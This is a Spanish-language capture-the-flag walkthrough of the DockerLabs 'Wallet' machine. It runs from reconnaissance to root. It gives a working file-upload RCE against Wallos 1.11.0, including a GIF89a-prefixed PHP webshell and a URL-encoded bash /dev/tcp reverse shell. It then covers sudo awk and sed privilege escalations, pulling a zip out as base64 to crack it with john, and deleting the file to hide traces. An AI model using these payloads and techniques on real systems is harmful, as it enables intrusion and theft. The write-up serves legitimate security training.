Lo primero que tenemos que hacer, es ir a la pagina de "dockerlabs.es" y bajarnos la maquina "Wallet".
Una vez hecho y COMO SIEMPRE, descomprimimos el archivo, e inicializamos la maquina con el comando:
```
sudo bash auto_deploy.sh wallet.tar
```
Lo primero de todo, tras desplegarse la maquina, es hacer un NMAP. No necesitamos hacer un ARP-SCAN (o NETDISCOVER), porque ya sabemos la IP de la maquina victima.
```
nmap -p- --open -sCV -sS --min-rate 5000 172.17.0.2 -n -Pn -vvv
```
Una vez terminado, vemos que tiene un unico puerto abierto:
```
Discovered open port 80/tcp on 172.17.0.2
```
En este caso, empezaremos poniendo en el navegador esta IP y ver si en la pagina, existe alguna informacion "util".

Vemos que nos dirige a una pagina de "Wallet" con varios enlaces que no nos llevan a ningun sitio y un pequeño carrusel con algun que otro enlace que tambien nos lleva a la pagina principal como el resto...

O eso es lo que puede parecer, pero lo cierto es que uno de los enlaces "Get A Quote" de la segunda foto del carrusel nos envia a "http://panel.wallet.dl" por lo que añadiremos este dominio a nuestro archivo de "/etc/hosts" quedando:
```
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters

172.17.0.2      panel.wallet.dl
```
Tras añadirlo, al volver a la pagina y pinchar sobre el enlace nos sale una pagina de registro de "Wallos". Pulsando "CTRL + U" no aparece nada interesante, por lo que vamos a proceder a registrarnos. Eso si, con un datos falsos, logicamente.

Una vez hecho, nos redirige a un panel de login, tambien de "Wallos", por lo que vamos a probar a loguearnos, y vemos que nos manda a otra pagina, pero esta vez con un panel de control arriba a la derecha (un desplegable) sobre nuestro nombre de usuario.

Aqui si vamos al apartado "About" vemos que nos dice que corre una version 1.11.0 de "Wallos", cosa que en principio recordaremos para ver luego si tiene alguna vulnerabilidad conocida.

Aparte de esto, la propia pagina, tambien nos permitiria añadir una "suscripcion", y vemos que podemos subir un logo, es decir, nos permite subir archivos.

Bien, ahora tendremos que hacer varias cosas.

1) Mirar si tiene alguna vulnerabilidad el sistema Wallos
2) Intentar subir un archivo que nos permita tener acceso a la maquina victima
3) Averiguar donde se suben los "logos"

Entonces empezaremos por buscar en google, por ejemplo, si existe alguna vulnerabilidad.

En mi caso, he instalado "searchsploit", por lo que usare este programa, obteniendo:
```
---------------------------------------------------------------------------------
Exploit Title                       |   Path
---------------------------------------------------------------------------------
Wallos < 1.11.2 - File Upload RCE   |   php/webapps/51924.txt
---------------------------------------------------------------------------------
```
Haciendo un "locate 51924.txt" obtenemos su ruta: 
```
locate 51924.txt

/usr/share/exploitdb/exploits/php/webapps/51924.txt
```
Nos lo traemos a nuestro directorio y hacemos un "cat" para ver su contenido, donde se pueden ver una serie de instrucciones de como "engañar" a "Wallos" y subir un archivo ".php" con una webshell.

¿Y como lo hacemos?

Pues lo primero de todo, creamos un archivo llamado, por ejemplo, "webshell.php".

Vamos al navegador, nos dirijimos a la pagina y creamos una suscripcion nueva, donde en la parte del logo, elegimos nuestro recien creado "webshell.php". Ahora, antes de guardarla/crearla, nos pasaremos a BURPSUITE.

No obstante, antes de ello, en el navegador, hay que ir a "opciones" y en "opciones de red", configuraremos un proxy manual con la IP 127.0.0.1 y el puerto 8080.

Una vez hecho esto, ahora si, abrimos el BURPSUITE, y en la parte de proxy ponemos "Intercept on".

Es momento de volver al navegador y guardar/crear nuestra suscripcion.

Veremos que BURPSUITE intercepta esta peticion, la cual pasaremos al "Repeater" haciendo click con el boton secundario del raton y eligiendo "Send to Repeater".

Ahora, modificamos la peticion interceptada y escribiremos lo que nos decia anteriormente el exploit que habia que cambiar:
```
Content-Disposition: form-data; name="logo"; filename="revshell.php"
 
Content-Type: image/jpeg

GIF89a;

<?php
	system($_GET['cmd']);
?>
```
Hecho esto, le daremos a "FORWARD" y veremos que nos sube el archivo. Pero, ¿y ahora donde puedo encontrar el archivo subido?

Bueno, pues dejamos esto de momento "aparcado" y vamos a hacer un poco de FUZZING WEB para ver si sacamos el directorio donde se suben los logotipos (que sera algo tipo "uploads").

Para ello, usaremos el "gobuster" de la siguiente forma:
```
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x php,html
```
Y recibimos esta informacion por pantalla:
```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 7022]
/images               (Status: 301) [Size: 309] [--> http://172.17.0.2/images/]
/css                  (Status: 301) [Size: 306] [--> http://172.17.0.2/css/]
/js                   (Status: 301) [Size: 305] [--> http://172.17.0.2/js/]
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
```
Vemos que hay una carpeta llamada "/images" por lo que probaremos con ella en el navegador y vemos que si entramos aqui, hay unos cuantos directorios por lo que iremos probando por ellos a ver si encontramos nuestro archivo ".php".

Finalmente, en "/images/uploads/logos" vemos nuestro archivo !!

Si lo ejecutamos, nos envia a una pagina donde vemos por pantalla "GIF89a;" que es justo lo que el exploit "51924.txt" nos decia.

Bien, ahora para ver si tenemos acceso, probamos a escribir en el navegador:
```
http://panel.wallet.dl/images/uploads/logos/XXXXXXX-NOMBRESCRIPT.php?cmd=whoami
```
y obtenemos el siguiente resultado:
```
GIF89a; www-data
```
Perfecto, es hora de intentar con NETCAT ponernos a la escucha y recibir una reverse en nuestra terminal.

Para ello, escribimos en ella "nc -nlvp 444", y en el navegador escribimos la tipica reverse, pero "url encondeada" obtenida de la pagina "https://www.revshells.com/":
```
bash -c "sh -i >& /dev/tcp/172.17.0.1/444 0>&1"
```
Para hacer esto, la propia pagina nos permite pasar dicho comando a formato "URL Encode", abajo a la derecha, y donde nos quedaria:
```
bash -c "sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.17.0.1%2F444%200%3E%261"
```
Con esto hemos obtenido ya la reverse shell y con ello, el acceso a la maquina victima. De todas formas, ahora es momento de hacer un tratamiento de la tty de la siguiente forma:
```
1) Escribimos:
	script /dev/null -c bash
2) Ahora pulsamos (CTRL + Z) y nos devuele a la terminal de la maquina atacante
3) Escribimos:
	stty raw -echo; fg
4) Una vez escrito lo anterior y vuelto a la maquina victima, escribimos:
	reset xterm
5) Finalmente, escribimos estos dos comandos:                    
    export TERM=xterm
    export SHELL=bash
6) Nos quedaria la terminal de la siguiente forma:
	www-data@8ddb09914e31:/var/www/wallos/images/uploads/logos$ 
```
Bueno, toca ahora intentar una escalada de privilegios, por lo que escribiremos en la terminal "sudo -l" y obteniendo:
```
www-data@8ddb09914e31:/var/www/wallos/images/uploads/logos$  sudo -l

Matching Defaults entries for www-data on 8ddb09914e31:
    env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User www-data may run the following commands on 8ddb09914e31:
    (pylon) NOPASSWD: /usr/bin/awk
    
www-data@8ddb09914e31:/var/www/wallos/images/uploads/logos$ 
```
Por lo que se ve, hay un usuario llamado "pylon" que puede ejecutar el binario "awk" sin contraseña, por lo que iremos a la pagina "https://gtfobins.github.io/" y buscaremos el binario "awk" en su seccion "Sudo", lo que nos muestra:
```
sudo awk 'BEGIN {system("/bin/sh")}'
```
Asi que ejecutamos este comando, pero con la ruta completa del binario "awk" y el usuario "pylon":
```
sudo -u pylon /usr/bin/awk 'BEGIN {system("/bin/sh")}'
```
Si ponemos "whoami" vemos lo siguiente:
```
$ whoami
pylon
$ 
```
por lo que escribiremos "script /dev/null -c bash" para tener un prompt mas "normal":
```
$ script /dev/null -c bash
Script started, output log file is '/dev/null'.

pylon@8ddb09914e31:/var/www/html$
```
Si hacemos un "cat /etc/passwd" vemos entre otra informacion, que hay un usuario que se llama "pinguino", por lo que buscaremos alguna forma de acceder a ese usuario.

Para ello, iremos buscando por los directorios de nuestro actual usuario "pylon" para ver si hay alguna pista.

Buscando y buscando, finalmente encontramos el archivo "secretitotraviesito.zip" en el directorio "/home/pylon":
```
pylon@8ddb09914e31:/$ cd home

pylon@8ddb09914e31:/home$ ls
pinguino  pylon

pylon@8ddb09914e31:/home$ cd pinguino
bash: cd: pinguino/: Permission denied

pylon@8ddb09914e31:/home$ cd pylon

pylon@8ddb09914e31:~$ ls
secretitotraviesito.zip

pylon@8ddb09914e31:~$ 
```
Pues nada, vamos a extraerlo:
```
pylon@8ddb09914e31:~$ unzip secretitotraviesito.zip 
Archive:  secretitotraviesito.zip
[secretitotraviesito.zip] notitachingona.txt password:
```
Pero como se puede ver, necesitamos una contraseña.

Ahora hay que intentar pasar el archivo a nuestro maquina atacante para poder descifrar la clave con "JOHN THE RIPPER" en local ya que no podemos montar un servidor python en la maquina victima, ni tenemos ssh, ftp ni nada.. por lo que la mejor forma es mediante "hash" en base64.

Para ello, lo primero que haremos sera sacar el archivo a otro diferente, y codificado en formato base64 como hemos dicho antes:
```
bash64 secretitotraviesito.zip > pass.zip.b64
```
Si hacemos esto, al poner luego "cat pass.zip.b64" obtenemos un "hash" tal y  como se ve a continuacion:
```
pylon@8ddb09914e31:~$ cat pass.zip.b64 

UEsDBBQACQAIAOdC7FiFVsOKIQAAABkAAAASABwAbm90aXRhY2hpbmdvbmEudHh0VVQJAAPx55Bm
8eeQZnV4CwABBOgDAAAE6AMAAJQl5oY0Dvf43JObusEOgH5BrIiUqdx+by9DgXMhrefNolBLBwiF
VsOKIQAAABkAAABQSwECHgMUAAkACADnQuxYhVbDiiEAAAAZAAAAEgAYAAAAAAABAAAApIEAAAAA
bm90aXRhY2hpbmdvbmEudHh0VVQFAAPx55BmdXgLAAEE6AMAAAToAwAAUEsFBgAAAAABAAEAWAAA
AH0AAAAAAA==
```
este "hash" lo copiaremos, EN NUESTRA maquina atacante, dentro de un archivo que crearemos con "nano" por ejemplo llamado "password.zip.b64:
```
nano password.zip.b64

Y COPIAMOS DENTRO EL HASH ANTERIOR:

UEsDBBQACQAIAOdC7FiFVsOKIQAAABkAAAASABwAbm90aXRhY2hpbmdvbmEudHh0VVQJAAPx55Bm
8eeQZnV4CwABBOgDAAAE6AMAAJQl5oY0Dvf43JObusEOgH5BrIiUqdx+by9DgXMhrefNolBLBwiF
VsOKIQAAABkAAABQSwECHgMUAAkACADnQuxYhVbDiiEAAAAZAAAAEgAYAAAAAAABAAAApIEAAAAA
bm90aXRhY2hpbmdvbmEudHh0VVQFAAPx55BmdXgLAAEE6AMAAAToAwAAUEsFBgAAAAABAAEAWAAA
AH0AAAAAAA==
```
En principio, de esta forma tenemos una copia exacta del archivo que teniamos en la maquina victima.

Ahora, el siguiente paso, seria descodificar este archivo generando otro nuevo en formato ".zip":
```
base64 -d password.zip.b64 > password.zip
```
Ahora sacamos un nuevo "hash" con "zip2john", que luego pasaremos a "JOHN THE RIPPER" y mediante fuerza bruta, intentaremos obtener la contraseña.
```
zip2john password.zip > hash
```
Esto, nos muestra lo siguiente:
```
ver 2.0 efh 5455 efh 7875 password.zip/notitachingona.txt PKZIP Encr: TS_chk, cmplen=33, decmplen=25, crc=8AC35685 ts=42E7 cs=42e7 type=8
```
Como se puede ver, esta ahi "notitachingona.txt" por lo que es momento de que nuestro amigo "JOHN THE RIPPER" trabaje e intente obtener la contraseña:
```
john --wordlist=/usr/share/wordlist/rockyou.txt hash
```
Tras unos segundos conseguimos obtener la credencial que estabamos buscando:
```
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
chocolate1       (password.zip/notitachingona.txt)     <==== Contraseña !!!
1g 0:00:00:00 DONE (2024-07-20 02:18) 9.090g/s 55854p/s 55854c/s 55854C/s 123456..iheartyou
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Vale, hora de volver a la maquina victima y borrar el archivo "pass.zip.b64" de la carpeta "/home/pylon" para dejar las menores huellas posibles:
```
pylon@8ddb09914e31:~$ rm pass.zip.b64
```
Una vez hecho, momento de extraer el archivo "secretitotraviesito.zip" usando la contraseña obtenida anteriormente:
```
pylon@8ddb09914e31:~$ unzip secretitotraviesito.zip 

Archive:  secretitotraviesito.zip
[secretitotraviesito.zip] notitachingona.txt password: 
  inflating: notitachingona.txt

pylon@8ddb09914e31:~$
```
Ahora con un "cat notitachingona.txt" vemos su contenido:
```
pylon@8ddb09914e31:~$ cat notitachingona.txt 

pinguino:pinguinomaloteh
```
Finalmente, vamos a ver si podemos cambiar de usuario y acceder como "pinguino". Para ello, escribimos:
```
pylon@8ddb09914e31:~$ su pinguino
Password: 

pinguino@8ddb09914e31:/home/pylon$ whoami
pinguino

pinguino@8ddb09914e31:/home/pylon$
```
Como se puede observar, al escribir "whoami" vemos que ya ya somos el usuario "pinguino" (tambien se podia ver el cambio en el prompt).

Bueno, es hora de intentar una escalada de privilegios, por lo que probaremos a ver con "sudo -l" si encontramos algo interesante y recibimos la siguiente informacion:
```
pinguino@8ddb09914e31:/home/pylon$ sudo -l

Matching Defaults entries for pinguino on 8ddb09914e31:
    env_reset, mail_badpass,    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty
User pinguino may run the following commands on 8ddb09914e31:
    (ALL) NOPASSWD: /usr/bin/sed
    
pinguino@8ddb09914e31:/home/pylon$
```
Ahora bien en "https://gtfobins.github.io/" o a traves de la aplicacion "searchbins" buscamos el binario "/sed" en su version "sudo" y vemos lo siguiente:
```
sudo sed -n '1e exec sh 1>&0' /etc/hosts
```
asi que lo ejecutamos, pero siempre con la ruta absoluta (completa), y ponemos "whoami" vemos que ya somos "root":
```
pylon@8ddb09914e31:~$ sudo /usr/bin/sed -n '1e exec sh 1>&0' /etc/hosts

# whoami
root
# 
```
Para obtener un prompt mas normal, podriamos escribir:
```
bash -p
```
o en su defecto:
```
script /dev/null -c bash
```
y nos quedaria de la siguiente forma (usando "script /dev/null -c bash"):
```
# script /dev/null -c bash

Script started, output log file is '/dev/null'.

root@8ddb09914e31:/home/pylon# whoami
root

root@8ddb09914e31:/home/pylon#
```
Finalmente podemos decir que hemos conseguido una intrusion en la maquina :) !!!!!
